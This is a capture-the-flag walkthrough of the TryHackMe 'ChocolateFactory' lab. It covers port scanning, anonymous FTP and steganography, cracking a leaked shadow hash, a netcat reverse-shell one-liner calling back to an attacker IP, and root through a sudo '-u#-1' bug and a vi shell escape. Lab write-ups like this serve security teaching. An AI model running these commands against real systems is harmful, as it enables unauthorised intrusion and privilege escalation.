---
title: "TryHackMe - ChocolateFactory"
author: Nasrallah
description: ""
date: 2022-09-15 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux]
img_path: /assets/img/tryhackme/chocolate
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [ChocolateFactory](https://tryhackme.com/room/chocolatefactory) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.83.100                                             
Host is up (0.078s latency).                                                  
Not shown: 989 closed tcp ports (reset)                                       
PORT    STATE SERVICE    VERSION                                              
21/tcp  open  ftp        vsftpd 3.0.3                                         
|_auth-owners: ERROR: Script execution failed (use -d to debug)                                                                                              
| ftp-syst:                                                                   
|   STAT:                                                                                                                                                    
| FTP server status:                                                          
|      Connected to ::ffff:10.11.31.131                                       
|      Logged in as ftp                                                       
|      TYPE: ASCII                                                            
|      No session bandwidth limit                                             
|      Session timeout in seconds is 300                                      
|      Control connection is plain text 
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
100/tcp open  newacct?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
109/tcp open  pop2?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
110/tcp open  pop3?                                                                                                                                          
|_ssl-date: ERROR: Script execution failed (use -d to debug)                                                                                                 
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
111/tcp open  rpcbind?
| fingerprint-strings: 
|   NULL, RPCCheck: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
113/tcp open  ident?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, NotesRPC, RPCChe
ck, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe, oracle-tns: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
|_auth-owners: ERROR: Script execution failed (use -d to debug)
119/tcp open  nntp?
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
|_sslv2: ERROR: Script execution failed (use -d to debug)
125/tcp open  locus-map?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
```

There are a bunch of open ports, let's start with ftp.

## FTP

From our scan, we see that ftp allows anonymous login.

![](1.png)

After logging in successfully, we find a .jpg file that we downloaded with `get {filename}`.

Let's inspect the file.

![](2.png)

We managed to extract a file from the image using `steghide`. The file seems to have a base64 encoded text, let's decode it with the command `base64 -d b64.txt`.

```terminal
$ base64 -d b64.txt     
daemon:*:18380:0:99999:7:::  
bin:*:18380:0:99999:7::: 
sys:*:18380:0:99999:7:::       
sync:*:18380:0:99999:7:::          
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::  
lp:*:18380:0:99999:7:::     
mail:*:18380:0:99999:7:::  
news:*:18380:0:99999:7:::  
uucp:*:18380:0:99999:7:::  
proxy:*:18380:0:99999:7:::   
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7::: 
list:*:18380:0:99999:7:::        
irc:*:18380:0:99999:7:::       
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::                                                                  [** SNIP **]                                       
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

Wow, it's a shadow file that has the password hash of user `charlie`. Let's crack the hash with john.

![](3.png)

Got charlie's password but couldn't log in via ssh.

## Web

Let's navigate to the web page.

![](4.png)

Using the password we cracked, let's login as charlie

![](5.png)

We see that we can execute command of the target.


# **Foothold**

With the command execution of the target, let's get a reverse shell.

First set up a listener with `nc -lvnp 9001`.

Now we execute the following command on target to get a shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

> Don't forget to change the ip in the command above to your vpn ip (tun0)

![](6.png)

We got a shell, and used python pty to stabilize it.

# **Privilege Escalation**

Let's do some basic enumeration.

![](7.png)

On Charlie's home directory, there is a file called **teleport** that has a ssh private key. Let's copy that to our machine and connect to charlie's account with it.   

![](8.png)

Nice. Now let's check our privilege with `sudo -l`.

![](9.png)

We see we can run `vi` but not as root. When we check the version of `sudo` in the target, we find it's vulnerable and has the following [exploit](https://www.exploit-db.com/exploits/47502).

![](10.png)

We can add `-u#-1` to our sudo command to run `vi` as root. Now let's check [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo) on how to get root with `vi`.

![](11.png)

Our full command would be this:

```bash
sudo -u#-1 /usr/bin/vi -c ':!/bin/bash' /dev/null
```

Somehow it didn't work, but if we removed `-u#-1` we become root.

![](12.png)

The key can be found on http://{Target_ip}/key_rev_key, we run `strings` on the executable and find the key.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
